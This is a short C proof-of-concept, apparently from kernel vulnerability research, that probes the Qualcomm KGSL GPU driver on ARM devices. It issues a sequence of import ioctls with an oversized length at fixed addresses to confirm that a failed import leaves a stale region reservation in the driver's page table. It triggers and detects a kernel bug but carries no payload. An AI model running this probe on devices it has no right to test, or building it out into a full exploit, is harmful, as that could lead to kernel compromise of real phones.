/* kgsl SVM stale-region confirmation.
 * 1) import good at A (reserves A).
 * 2) import with oversized len at B (region set, then sg fail -> EINVAL).
 * 3) import good at B again -> if it now returns ENOMEM, the region from step 2
 *    was left in the pagetable rbtree (stale reservation) => bug confirmed.
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define TYPE_ADDR 2
#define NR_IMPORT 0x48

struct imp { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
struct ua  { uint64_t virtaddr; };

static void *fixmap(uintptr_t addr,size_t len){
    void *m=mmap((void*)addr,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
    if(m!=MAP_FAILED) memset(m,0x41,len);
    return m;
}
static int imp(int fd,void *m,unsigned long long sz,unsigned int *id){
    struct imp p; memset(&p,0,sizeof p); struct ua u; memset(&u,0,sizeof u);
    u.virtaddr=(uint64_t)(uintptr_t)m;
    p.priv=(uint64_t)(uintptr_t)&u; p.priv_len=sz; p.type=TYPE_ADDR;
    errno=0; int r=ioctl(fd,_IOWR(KGSL_IOC_TYPE,NR_IMPORT,struct imp),&p);
    if(id)*id=p.id; return r;
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    printf("== kgsl SVM stale-region probe (uid=%d) ==\n",(int)getuid());
    int fd=open(DEV,O_RDWR); if(fd<0){printf("open: %s\n",strerror(errno));return 1;}
    uintptr_t A=0x60000000ULL, B=0x60200000ULL, C=0x60400000ULL;
    size_t L=0x1000;
    void *a=fixmap(A,L), *b=fixmap(B,L), *c=fixmap(C,L);
    printf("[*] A=%p B=%p C=%p len=0x%zx\n",a,b,c,L);

    unsigned int id=0; int r;
    r=imp(fd,a,L,&id);          printf("[1] import A good     -> r=%d errno=%d id=%u\n",r,errno,id);
    r=imp(fd,b,0x2000,&id);     printf("[2] import B size=2p  -> r=%d errno=%d(%s)  (region set then sg-fail)\n",r,errno,strerror(errno));
    r=imp(fd,b,L,&id);          printf("[3] import B good     -> r=%d errno=%d(%s)  <= ENOMEM == STALE REGION CONFIRMED\n",r,errno,strerror(errno));
    r=imp(fd,c,L,&id);          printf("[4] import C good     -> r=%d errno=%d(%s)  (control, should work)\n",r,errno,strerror(errno));
    printf("== done ==\n");
    return 0;
}
